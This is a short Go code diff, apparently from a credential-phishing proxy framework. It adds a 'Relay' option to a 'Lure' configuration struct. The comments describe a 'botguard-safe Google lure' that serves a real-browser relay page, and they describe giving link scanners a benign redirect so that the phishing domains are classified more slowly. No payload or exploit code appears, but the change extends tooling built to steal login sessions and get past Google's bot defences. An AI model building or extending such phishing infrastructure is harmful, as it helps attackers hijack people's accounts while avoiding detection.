@@ -34,6 +34,9 @@ type Lure struct {
 	// previews) gets a benign redirect and never sees the login flow — this
 	// is what slows hostname classification on fresh domains.
 	Token string `mapstructure:"token" json:"token" yaml:"token"`
+	// Relay: when true the lure serves the real-browser relay page (bgrel)
+	// instead of proxied origin content — a botguard-safe Google lure.
+	Relay bool `mapstructure:"relay" json:"relay" yaml:"relay"`
 }
 
 type SubPhishlet struct {
